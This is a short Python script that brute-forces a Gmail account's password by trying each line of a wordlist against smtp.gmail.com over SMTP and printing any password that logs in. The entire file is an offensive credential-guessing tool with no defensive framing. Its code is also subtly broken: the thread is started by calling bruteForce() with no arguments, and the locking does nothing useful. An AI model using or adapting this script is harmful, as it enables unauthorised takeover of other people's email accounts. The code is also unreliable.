#!/usr/bin/env python3

import smtplib
import threading
import sys

threadLock = threading.Lock()
threads = []

def bruteForce(email, wordlist):
    with open(wordlist) as file:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            try:
                for password in file:
                    try:
                        server.login(email, password)
                        threadLock.acquire()
                        print(f"The password is: \033[93m{password.strip()}\033[0m")
                        threadLock.release()
                    except smtplib.SMTPAuthenticationError:
                        threadLock.acquire()
                        pass
                        threadLock.release()
                        continue
                    except smtplib.SMTPServerDisconnected:
                        continue
            except KeyboardInterrupt:
                print("")
                sys.exit()
        except:
            pass

if __name__ == '__main__':
    t = threading.Thread(target=bruteForce())
    threads.append(t)
    t.start()

    for i in threads:
        i.join()
    print("\nDone!")

    
